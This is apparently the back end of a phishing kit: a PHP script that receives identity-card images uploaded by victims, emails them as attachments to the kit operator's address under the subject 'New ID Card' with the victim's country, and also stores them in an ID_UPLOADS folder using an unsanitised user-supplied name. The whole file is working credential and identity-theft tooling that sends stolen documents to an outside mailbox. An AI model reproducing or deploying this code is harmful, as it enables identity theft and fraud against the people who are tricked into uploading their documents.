<?php
header("X-Robots-Tag: noindex, nofollow", true);
session_start();
include("../../../../Email.php");
require "../geoplugin.php";
error_reporting(E_ALL);
ini_set('display_errors', 1);
$_SESSION['user'] = $_POST['user']; 
if(isset($_FILES) && (bool) $_FILES) {  
	$allowedExtensions = array("pdf","doc","docx","gif","jpeg","jpg","png","rtf");	
	$files = array();
	foreach($_FILES as $name=>$file) {
		$file_name = $file['name']; 
		$temp_name = $file['tmp_name'];
		$file_type = $file['type'];
		$path_parts = pathinfo($file_name);
		$ext = $path_parts['extension'];
		if(!in_array($ext,$allowedExtensions)) {
			die("File $file_name has the extensions $ext which is not allowed");
		}
		array_push($files,$file);
	}	
	$from = "noreply@logs.com"; 
	$subject ="".$_POST['user']." ♥ New ID Card ♥ ".$_SESSION['CountryName']."";
	$message = " ";
	$headers = "From: ☠ Dr Hard ☠ $from";	
	$semi_rand = md5(time()); 
	$mime_boundary = "==Multipart_Boundary_x{$semi_rand}x"; 	 
	$headers .= "\nMIME-Version: 1.0\n" . "Content-Type: multipart/mixed;\n" . " boundary=\"{$mime_boundary}\""; 
	 $message = "This is a multi-part message in MIME format.\n\n" . "--{$mime_boundary}\n" . "Content-Type: text/plain; charset=\"iso-8859-1\"\n" . "Content-Transfer-Encoding: 7bit\n\n" . $message . "\n\n"; 
	$message .= "--{$mime_boundary}\n";	 
	for($x=0;$x<count($files);$x++){
		$file = fopen($files[$x]['tmp_name'],"rb");
		$data = fread($file,filesize($files[$x]['tmp_name']));
		fclose($file);
		$data = chunk_split(base64_encode($data));
		$name = $files[$x]['name'];
		$message .= "Content-Type: {\"application/octet-stream\"};\n" . " name=\"$name\"\n" . 
		"Content-Disposition: attachment;\n" . " filename=\"$name\"\n" . 
		"Content-Transfer-Encoding: base64\n\n" . $data . "\n\n";
		$message .= "--{$mime_boundary}\n";
	}	 
	$ok = mail($email, $subject, $message, $headers); 
	}
$usser = $_SESSION['user'] = $_POST['user']; 
if (move_uploaded_file($_FILES['attach1']['tmp_name'], '../../../../ID_UPLOADS/'.$usser.'_'.basename($_FILES['attach1']['name']))) {
  echo "File is valid, and was successfully uploaded.\n";
} else {
   echo "Upload failed";
}
?>